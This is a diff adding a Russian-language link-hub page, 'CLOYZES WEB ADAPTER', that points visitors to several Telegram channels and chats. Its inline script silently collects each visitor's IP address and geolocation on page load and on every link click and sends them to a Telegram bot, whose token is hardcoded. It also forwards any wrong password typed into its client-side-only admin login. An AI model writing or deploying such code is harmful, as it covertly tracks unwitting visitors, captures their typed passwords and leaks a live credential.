@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>CLOYZES · WEB ADAPTER</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at 30% 10%, #1e1004 0%, #0b0703 100%);
+      background-attachment: fixed;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      position: relative;
+      color: #fff;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      width: 150%;
+      height: 150%;
+      top: -25%;
+      left: -25%;
+      background: radial-gradient(circle at 50% 50%, rgba(255, 100, 0, 0.12) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: 0;
+      animation: subtlePulse 10s infinite alternate;
+    }
+    @keyframes subtlePulse {
+      0% { opacity: 0.5; transform: scale(1); }
+      100% { opacity: 1; transform: scale(1.02); }
+    }
+    .adapter-wrapper {
+      max-width: 1300px;
+      width: 100%;
+      margin: 0 auto;
+      position: relative;
+      z-index: 5;
+      backdrop-filter: blur(2px);
+    }
+    .admin-trigger {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 100;
+    }
+    .admin-btn {
+      background: rgba(20, 12, 8, 0.8);
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255, 140, 0, 0.5);
+      color: #ffb27a;
+      width: 52px;
+      height: 52px;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+      box-shadow: 0 8px 0 #2b1507, 0 5px 20px #000, 0 0 15px #ff7b0040;
+      transition: all 0.2s;
+      border: 1px solid #ff8c00;
+    }
+    .admin-btn:hover {
+      transform: translateY(4px);
+      box-shadow: 0 4px 0 #1f0e04, 0 8px 20px #000;
+      background: #ff7b00;
+      color: #0c0704;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      position: relative;
+    }
+    .glitch-title {
+      font-weight: 800;
+      font-size: clamp(2.4rem, 12vw, 4.8rem);
+      letter-spacing: -0.02em;
+      text-transform: uppercase;
+      background: linear-gradient(135deg, #ffffff 0%, #ffb87c 45%, #ff7b00 80%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 30px rgba(255, 100, 0, 0.6);
+      margin-bottom: 8px;
+      animation: titleGlow 3s infinite alternate;
+    }
+    @keyframes titleGlow {
+      0% { text-shadow: 0 0 20px rgba(255, 120, 0, 0.5); }
+      100% { text-shadow: 0 0 45px rgba(255, 80, 0, 0.9), 0 0 10px #ff5e00; }
+    }
+    .sub-line {
+      height: 3px;
+      width: 120px;
+      margin: 10px auto 0;
+      background: linear-gradient(90deg, transparent, #ff8c00, #ff3c00, #ff8c00, transparent);
+      border-radius: 100px;
+      box-shadow: 0 0 15px #ff6200;
+    }
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 24px;
+      align-items: stretch;
+      justify-content: center;
+    }
+    .card {
+      background: rgba(8, 6, 4, 0.7);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border: 1px solid rgba(255, 120, 0, 0.25);
+      border-radius: 36px;
+      padding: 28px 16px 26px;
+      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 100, 0, 0.1) inset, 0 8px 0 0 rgba(0, 0, 0, 0.3);
+      transition: all 0.35s cubic-bezier(0.23, 1, 0.32, 1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      transform: translateY(0);
+    }
+    .card::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: 36px;
+      padding: 2px;
+      background: linear-gradient(145deg, #ff8c00, #ff3c00, #ffae00);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      opacity: 0;
+      transition: opacity 0.45s ease;
+      pointer-events: none;
+    }
+    .card:hover::after { opacity: 1; }
+    .card:hover {
+      transform: translateY(-10px) scale(1.01);
+      box-shadow: 0 30px 50px -8px #000000dd, 0 0 30px rgba(255, 100, 0, 0.5), 0 8px 0 0 #1f1308;
+      border-color: rgba(255, 140, 0, 0.6);
+      background: rgba(12, 8, 5, 0.8);
+      backdrop-filter: blur(18px);
+    }
+    .icon-wrapper {
+      width: 90px;
+      height: 90px;
+      background: linear-gradient(145deg, #1e130b, #0d0906);
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      border: 1.5px solid #ff7b0040;
+      box-shadow: 0 12px 0 #0a0603, 0 8px 20px #00000080, inset 0 2px 4px rgba(255, 180, 80, 0.3);
+      transition: all 0.3s ease;
+      position: relative;
+    }
+    .card:hover .icon-wrapper {
+      border-color: #ff9900;
+      box-shadow: 0 10px 0 #0f0904, 0 15px 30px #000, inset 0 0 20px #ff8c0066;
+      transform: scale(1.02);
+    }
+    .icon-wrapper i {
+      font-size: 48px;
+      color: #fff;
+      text-shadow: 0 0 20px #ff8c00, 0 4px 8px #00000080;
+      background: linear-gradient(135deg, #fff8e7, #ffc285);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .card h3 {
+      font-weight: 700;
+      font-size: 1.7rem;
+      margin-bottom: 6px;
+      color: #fff4e6;
+      text-shadow: 0 2px 5px #00000080;
+    }
+    .badge {
+      font-size: 0.85rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #ffb27a;
+      margin-bottom: 22px;
+    }
+    .card-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: linear-gradient(145deg, #ff7b00, #e65100);
+      border: none;
+      border-radius: 60px;
+      padding: 14px 24px;
+      width: 100%;
+      max-width: 180px;
+      margin-top: auto;
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #0c0704;
+      text-decoration: none;
+      box-shadow: 0 12px 0 #4a1e00, 0 5px 15px #00000080, 0 0 15px #ff7b0040;
+      transition: all 0.2s ease;
+      border: 1px solid #ffb45b;
+      text-transform: uppercase;
+      cursor: pointer;
+      transform: translateY(0);
+    }
+    .card-btn i { font-size: 1rem; color: #0c0704; transition: transform 0.2s; }
+    .card-btn:hover {
+      background: linear-gradient(145deg, #ff9a2e, #ff5e00);
+      box-shadow: 0 8px 0 #3d1700, 0 10px 25px #000, 0 0 25px #ff8c00;
+      transform: translateY(4px);
+      color: #000;
+      border-color: #ffd29e;
+    }
+    .card-btn:hover i { transform: translateX(5px); }
+    .card-btn:active {
+      transform: translateY(8px);
+      box-shadow: 0 4px 0 #2e1000, 0 8px 20px black;
+    }
+    /* Адаптив */
+    @media screen and (max-width: 780px) {
+      .card-grid { grid-template-columns: repeat(2, 1fr); gap: 18px; }
+      .card { padding: 22px 12px 20px; border-radius: 32px; }
+      .icon-wrapper { width: 75px; height: 75px; border-radius: 24px; }
+      .icon-wrapper i { font-size: 40px; }
+      .card h3 { font-size: 1.4rem; }
+      .card-btn { padding: 12px 10px; font-size: 1rem; max-width: 160px; }
+    }
+    @media screen and (max-width: 480px) {
+      body { padding: 16px 10px; align-items: flex-start; }
+      .glitch-title { font-size: 2rem; }
+      .card { padding: 18px 8px 16px; border-radius: 28px; }
+      .icon-wrapper { width: 65px; height: 65px; border-radius: 20px; }
+      .icon-wrapper i { font-size: 34px; }
+      .card h3 { font-size: 1.2rem; }
+      .badge { font-size: 0.7rem; margin-bottom: 14px; }
+      .card-btn { padding: 10px 6px; font-size: 0.9rem; max-width: 140px; }
+    }
+    /* Модалки и админ-панель */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.8);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+      opacity: 0;
+      visibility: hidden;
+      transition: 0.2s;
+    }
+    .modal-overlay.active { opacity: 1; visibility: visible; }
+    .admin-modal {
+      background: #140e08;
+      border: 1px solid #ff7b00;
+      border-radius: 40px;
+      padding: 32px 28px;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 30px 40px #000, 0 0 30px #ff5e00;
+    }
+    .admin-modal h2 { color: #ffc285; margin-bottom: 24px; font-weight: 600; }
+    .admin-modal input {
+      width: 100%;
+      padding: 16px 20px;
+      background: #1f140c;
+      border: 1px solid #ff8c00;
+      border-radius: 50px;
+      color: white;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      outline: none;
+    }
+    .admin-modal button {
+      background: #ff7b00;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 50px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      box-shadow: 0 8px 0 #4a1e00;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+    .admin-modal .secondary-btn {
+      background: #2b1b0f;
+      color: #ffb27a;
+      box-shadow: 0 5px 0 #140b05;
+      border: 1px solid #ff7b0050;
+    }
+    .admin-panel {
+      background: rgba(8, 5, 3, 0.95);
+      backdrop-filter: blur(16px);
+      border-radius: 40px;
+      padding: 28px 22px;
+      margin-top: 30px;
+      border: 1px solid #ff9900;
+      box-shadow: 0 0 40px #ff6a00;
+      max-height: 500px;
+      overflow-y: auto;
+      display: none;
+    }
+    .admin-panel.active { display: block; }
+    .panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .log-table {
+      width: 100%;
+      border-collapse: collapse;
+      color: #eee;
+      font-size: 0.9rem;
+    }
+    .log-table th {
+      text-align: left;
+      padding: 12px 6px;
+      border-bottom: 2px solid #ff7b00;
+      color: #ffae6a;
+    }
+    .log-table td { padding: 10px 6px; border-bottom: 1px solid #3f2a18; }
+    .clear-logs-btn, .export-btn {
+      background: #331e0e;
+      border: 1px solid #ff8800;
+      color: #ffbc8a;
+      padding: 8px 16px;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-right: 8px;
+    }
+    .logout-btn {
+      background: none;
+      border: 1px solid #ff4f00;
+      color: #ff9066;
+      padding: 6px 14px;
+      border-radius: 30px;
+      cursor: pointer;
+    }
+    .hint {
+      margin-top: 20px;
+      text-align: center;
+      color: #ffc8a2;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+<div class="adapter-wrapper">
+  <div class="header">
+    <div class="glitch-title">CLOYZES WEB ADAPTER</div>
+    <div class="sub-line"></div>
+  </div>
+
+  <!-- Карточки -->
+  <div class="card-grid">
+    <!-- Канал -->
+    <div class="card">
+      <div class="icon-wrapper"><i class="fas fa-satellite-dish"></i></div>
+      <h3>Канал</h3>
+      <div class="badge">Telegram · основной</div>
+      <a href="https://t.me/+__P-DGkzK-xlMTY1" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Канал">
+        <span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i>
+      </a>
+    </div>
+    <!-- Чат -->
+    <div class="card">
+      <div class="icon-wrapper"><i class="fas fa-comments"></i></div>
+      <h3>Чат</h3>
+      <div class="badge">Общение · комьюнити</div>
+      <a href="https://t.me/+Xn03y4HZW1diZjkx" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Чат">
+        <span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i>
+      </a>
+    </div>
+    <!-- Прайс -->
+    <div class="card">
+      <div class="icon-wrapper"><i class="fas fa-tags"></i></div>
+      <h3>Прайс</h3>
+      <div class="badge">Услуги · стоимость</div>
+      <a href="https://t.me/priceviase" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Прайс">
+        <span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i>
+      </a>
+    </div>
+    <!-- Личные сообщения -->
+    <div class="card">
+      <div class="icon-wrapper"><i class="fas fa-envelope-open-text"></i></div>
+      <h3>Личные сообщения</h3>
+      <div class="badge">Написать напрямую</div>
+      <a href="http://t.me/viase" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Личные сообщения">
+        <span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i>
+      </a>
+    </div>
+  </div>
+
+  <!-- Админ-панель -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="panel-header">
+      <h3><i class="fas fa-shield-alt"></i> АДМИН-ЛОГИ</h3>
+      <div>
+        <button class="export-btn" id="exportLogsBtn"><i class="fas fa-download"></i> Экспорт</button>
+        <button class="clear-logs-btn" id="clearLogsBtn"><i class="fas fa-trash-alt"></i> Очистить</button>
+        <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Выйти</button>
+      </div>
+    </div>
+    <div style="overflow-x: auto;">
+      <table class="log-table" id="logTable">
+        <thead><tr><th>Время</th><th>IP</th><th>Геолокация</th><th>Действие</th></tr></thead>
+        <tbody id="logBody"></tbody>
+      </table>
+    </div>
+    <div class="hint" id="logCount">Записей: 0</div>
+  </div>
+</div>
+
+<!-- Кнопка админа -->
+<div class="admin-trigger">
+  <div class="admin-btn" id="adminBtn"><i class="fas fa-user-secret"></i></div>
+</div>
+
+<!-- Модальное окно входа -->
+<div class="modal-overlay" id="authModal">
+  <div class="admin-modal">
+    <h2 id="modalTitle">Вход в админ-панель</h2>
+    <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="off">
+    <button id="modalPrimaryBtn">Войти</button>
+    <button class="secondary-btn" id="modalSecondaryBtn">Установить пароль</button>
+    <button class="secondary-btn" id="closeModalBtn">Отмена</button>
+    <div style="color:#ff9f5e; font-size:0.8rem; margin-top:10px;" id="modalHint"></div>
+  </div>
+</div>
+
+<script>
+  (function(){
+    // Telegram
+    const TELEGRAM_BOT_TOKEN = '8685336894:AAEqug-7sPJf-Bc7CINGwRgv4wWwTWJWzg0';
+    const TELEGRAM_CHAT_ID = '8440147333';
+    async function sendToTelegram(msg) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML'})
+        });
+      } catch(e) {}
+    }
+
+    // Хранилище
+    const STORAGE_PASS = 'admin_password';
+    const STORAGE_LOGS = 'site_logs';
+    function getLogs() { return JSON.parse(localStorage.getItem(STORAGE_LOGS)) || []; }
+    function saveLogs(logs) { localStorage.setItem(STORAGE_LOGS, JSON.stringify(logs)); }
+    function addLog(entry) {
+      const logs = getLogs(); logs.push(entry); saveLogs(logs);
+      if (isAdminPanelVisible()) renderLogs();
+    }
+    function getPassword() { return localStorage.getItem(STORAGE_PASS); }
+    function setPassword(p) { localStorage.setItem(STORAGE_PASS, p); }
+
+    // UI
+    const adminPanel = document.getElementById('adminPanel');
+    const logBody = document.getElementById('logBody');
+    const logCount = document.getElementById('logCount');
+    let isAdmin = false;
+    function isAdminPanelVisible() { return adminPanel.classList.contains('active'); }
+
+    function renderLogs() {
+      const logs = getLogs();
+      logBody.innerHTML = '';
+      if (!logs.length) {
+        logBody.innerHTML = '<tr><td colspan="4" style="padding:20px;text-align:center;color:#aaa;">Нет записей</td></tr>';
+        logCount.textContent = 'Записей: 0';
+        return;
+      }
+      logs.slice().reverse().forEach(l => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `<td>${l.time}</td><td>${l.ip}</td><td>${l.geo || ''}</td><td>${l.action}</td>`;
+        logBody.appendChild(tr);
+      });
+      logCount.textContent = `Записей: ${logs.length}`;
+    }
+
+    async function getIpAndGeo() {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+        // ИСПРАВЛЕНО: HTTPS протокол
+        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
+        const geo = await geoRes.json();
+        const geoStr = `${geo.city || ''}, ${geo.country || ''}`.trim();
+        return { ip, geo: geoStr || 'Неизвестно' };
+      } catch { return { ip: '?', geo: 'Неизвестно' }; }
+    }
+
+    async function logEvent(action) {
+      const { ip, geo } = await getIpAndGeo();
+      const time = new Date().toLocaleString('ru-RU');
+      addLog({ time, ip, geo, action });
+      sendToTelegram(`🕒 ${time}\n🌐 IP: ${ip}\n📍 ${geo}\n📌 ${action}`);
+    }
+
+    // Инициализация
+    (async () => {
+      await logEvent('🌐 Посещение страницы');
+      document.querySelectorAll('.js-link').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          logEvent(`🔗 Переход: ${btn.dataset.name}`);
+        });
+      });
+    })();
+
+    // Админка
+    const authModal = document.getElementById('authModal');
+    function openAuthModal(mode) {
+      const has = !!getPassword();
+      document.getElementById('modalTitle').textContent = has ? (mode==='set'?'Смена пароля':'Вход в админ-панель') : 'Установите пароль';
+      document.getElementById('modalPrimaryBtn').textContent = has ? (mode==='set'?'Сменить':'Войти') : 'Сохранить';
+      document.getElementById('modalSecondaryBtn').style.display = has && mode!=='set' ? 'block' : 'none';
+      document.getElementById('modalHint').textContent = '';
+      document.getElementById('passwordInput').value = '';
+      authModal.classList.add('active');
+    }
+
+    document.getElementById('adminBtn').onclick = () => {
+      if (isAdmin) { adminPanel.classList.toggle('active'); if(adminPanel.classList.contains('active')) renderLogs(); }
+      else openAuthModal('login');
+    };
+    document.getElementById('modalPrimaryBtn').onclick = async () => {
+      const pass = document.getElementById('passwordInput').value.trim();
+      if(!pass) return;
+      const stored = getPassword();
+      if(!stored) { setPassword(pass); isAdmin=true; authModal.classList.remove('active'); adminPanel.classList.add('active'); renderLogs(); logEvent('🔐 Установлен пароль администратора'); }
+      else {
+        const isSet = document.getElementById('modalPrimaryBtn').textContent.includes('Сменить');
+        if(isSet) { setPassword(pass); authModal.classList.remove('active'); logEvent('🔑 Пароль изменён'); }
+        else if(pass === stored) { isAdmin=true; authModal.classList.remove('active'); adminPanel.classList.add('active'); renderLogs(); logEvent('✅ Вход в админку'); }
+        else {
+          document.getElementById('modalHint').textContent = 'Неверный пароль';
+          const { ip, geo } = await getIpAndGeo();
+          // Добавляем в сообщение введённый неверный пароль
+          sendToTelegram(`⚠️ Неверный ввод пароля!\n🕒 ${new Date().toLocaleString('ru-RU')}\n🌐 IP: ${ip}\n📍 ${geo}\n🔑 Введённый пароль: ${pass}`);
+        }
+      }
+    };
+    document.getElementById('modalSecondaryBtn').onclick = () => { if(getPassword()) openAuthModal('set'); };
+    document.getElementById('closeModalBtn').onclick = () => authModal.classList.remove('active');
+    document.getElementById('logoutBtn').onclick = async () => { isAdmin=false; adminPanel.classList.remove('active'); logEvent('🚪 Выход'); };
+    document.getElementById('clearLogsBtn').onclick = () => { if(confirm('Очистить все логи?')) { localStorage.setItem(STORAGE_LOGS, '[]'); renderLogs(); logEvent('🧹 Логи очищены'); } };
+    document.getElementById('exportLogsBtn').onclick = () => {
+      const blob = new Blob([JSON.stringify(getLogs(), null, 2)], {type: 'application/json'});
+      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+      a.download = `cloyzes_logs_${new Date().toISOString().slice(0,10)}.json`; a.click();
+      logEvent('📤 Экспорт логов');
+    };
+    authModal.addEventListener('click', e => { if(e.target===authModal) authModal.classList.remove('active'); });
+  })();
+</script>
+</body>
+</html>
